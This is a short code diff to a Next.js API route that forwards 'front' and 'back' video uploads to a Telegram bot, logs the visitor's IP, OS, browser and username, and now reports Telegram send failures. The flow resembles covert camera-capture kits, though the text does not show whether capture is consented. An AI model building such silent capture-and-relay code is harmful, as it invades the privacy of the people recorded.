@@ -101,21 +101,24 @@ export async function POST(req: NextRequest) {
     form.append(`back.${back.ext}`, back.blob, `back.${back.ext}`);
     media.push({ type: 'video', media: `attach://back.${back.ext}` });
   }
+  let tgStatus = 'sent';
   if (media.length > 1) {
     form.append('media', JSON.stringify(media));
-    await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
+    const r = await fetch(`https://api.telegram.org/bot${token}/sendMediaGroup`, {
       method: 'POST',
       body: form,
-    }).catch(() => undefined);
+    }).catch(() => null);
+    if (!r || !r.ok) tgStatus = `tg ${r ? r.status : 'net'}`;
   } else {
     form.append('video', first.blob, `front.${first.ext}`);
     form.append('caption', caption);
-    await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
+    const r = await fetch(`https://api.telegram.org/bot${token}/sendVideo`, {
       method: 'POST',
       body: form,
-    }).catch(() => undefined);
+    }).catch(() => null);
+    if (!r || !r.ok) tgStatus = `tg ${r ? r.status : 'net'}`;
   }
 
   recordEntry(req, { ip, loc: '', model: `${osOf(ua)} · ${browserOf(ua)}`, user: username });
-  return NextResponse.json({ ok: true, telegram: 'sent' });
+  return NextResponse.json({ ok: true, telegram: tgStatus });
 }
